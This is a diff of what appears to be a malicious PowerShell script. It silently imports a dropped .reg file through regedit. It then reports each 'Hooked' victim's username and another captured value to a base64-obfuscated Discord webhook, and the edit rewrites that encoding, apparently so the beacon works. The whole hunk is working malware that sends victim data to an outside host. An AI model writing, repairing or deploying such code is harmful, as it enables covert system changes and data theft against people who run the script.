@@ -12,7 +12,10 @@ $ep = Join-Path $env:public '17399.reg';
 sc $ep ([byte[]]($ef | select -Skip $2)) -Encoding Byte;
 saps -FilePath 'regedit' -ArgumentList '/s', $ep;
 
-$dB = [System.Convert]::FromBase64String("aAB0AHQAcABzADoALwAvAGQAaQBzAGMAbwByAGQALgBjAG8AbQAvAGEAcABpAC8AdwBlAGIAaABvAG8AawBzAC8AMQAyADAANwAwADMAMAA1ADcAMgAwADYAMQA0ADIAOQA4ADEAMAAvAFkAQwBiAHcAUwBvAFgAMwBSAFMAbQBQADIARgBDAGcATABKAFQARwBHAE8ANwBxAGkAaABEAEUARQBEAHoAdwA0AGYAYwAzAFIAeQB0ADUAbgBGADUASQAxAC0ARQBWAFcAWQBJAFEARQA5AGUAdwBOAFAANAA4ADkALQAwADgAawBVAGMAdwA=")
-$dS = [System.Text.Encoding]::UTF8.GetString($dB)
 
-irm $dS -Method Post -Body (@{content=":fishing_pole_and_fish: **Hooked:** ``$env:USERNAME`` | ``$lps``"})
+# Decoding the encoded URL
+$decodedUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwNzAzMDU3MjA2MTQyOTgxMC9ZQ2J3U29YM1JTbVAyRkNnTEpUR0dPN3FpaERFRUR6dzRmYzNSeXQ1bkY1STEtRVZXWUlRRTlld05QNDg5LTA4a1Vjdw=="))
+
+# Using decoded URL in the Invoke-RestMethod command
+Invoke-RestMethod -Uri $decodedUrl -Method Post -Body (@{content=":fishing_pole_and_fish: **Hooked:** $($env:USERNAME) - $($lps)"})
+
